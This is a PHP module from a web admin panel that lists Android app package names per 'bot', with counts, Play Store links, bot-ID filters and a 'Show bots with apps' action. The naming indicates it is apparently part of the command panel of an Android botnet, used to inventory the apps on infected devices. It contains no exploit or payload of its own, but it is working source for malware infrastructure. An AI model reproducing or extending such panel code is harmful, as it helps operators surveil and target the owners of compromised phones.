<?php
require_once "cmd_mod.php";

class apps extends modBase
{
	protected $module_name = 'apps';

	function get_filter()
	{
		$fields = array(
		// id, name, placeholder, custom_pattern, is_like
			array('bot_id', 'Bot ID', 'Bot ID', modBase::$filters['bot_id']),
			array('app_name', 'App name', 'com.android', modBase::$filters['appname']),
		);
		
		return $this->build_filter($fields);
	}


	function get_content()
	{
		$bot_id = hlp::get($this->filter_values, 'bot_id', '');
		$app_name = hlp::get($this->filter_values, 'app_name', '');

		$sql = "select id, name, total_count from apps";
		$sql_count = "select count(id) from apps";
			
		$wheres = array();
		if ($bot_id != ''){
			$wheres[] = "id in (select app_id from bot_apps where bot_id = {$this->db->quote($bot_id)})";
		}
		
		if($app_name != ''){
			$wheres[] = "name = {$this->db->quote($app_name)}";
		}
		
		if(sizeof($wheres))
		{
			$where_sql = " WHERE ";
			foreach($wheres as $w)
				$where_sql .= $w . " AND ";
				
			$where_sql = substr($where_sql, 0, strlen($where_sql)-4);

			$sql = $sql . $where_sql;
			$sql_count = $sql_count . $where_sql;
		}
	
		$total_rows = $this->db->exec($sql_count, null, true)[0][0];
		$paging = $this->get_limit($total_rows, $this->results_on_page);
		$sql .= " order by total_count desc";
		$sql .= $paging['sql'];

		$headers = array();
		$headers[] = '<a href="javascript:select_all(\'input[id^=&quot;apps-table-chk-&quot;]\');undefined"><span class="fui-checkbox-checked" title="Check all"></span></a>';
		$headers[] = "App name";
		$headers[] = "Total count";

		$data = $this->db->exec($sql, null, true);

		$rows = array();
		foreach ($data as $row) {
			$tmp = array();
			$tmp[] = "<label class='checkbox' for='apps-table-chk-{$row['id']}'>
					<input type='checkbox' value='{$row['id']}' id='apps-table-chk-{$row['id']}' data-toggle='checkbox' />
				</label>";
			$tmp[] = "<a href='https://play.google.com/store/apps/details?id={$row['name']}' target='_blank' data-id='{$row['id']}'>{$row['name']}</a>";
			$tmp[] = $row['total_count'];
			$rows[] = $tmp;
		}

		$content = $this->get_table($rows, $headers, 'textcenter');
	
			
		$buttons = array(
			array('Show bots&nbsp;', 'Show bots with apps', 'apps_show_bots()', 'primary'),
		);
		return $this->wrap_content("Total: {$paging['total_rows']}", $content, $paging['pages'], $buttons);
	}
	
}

















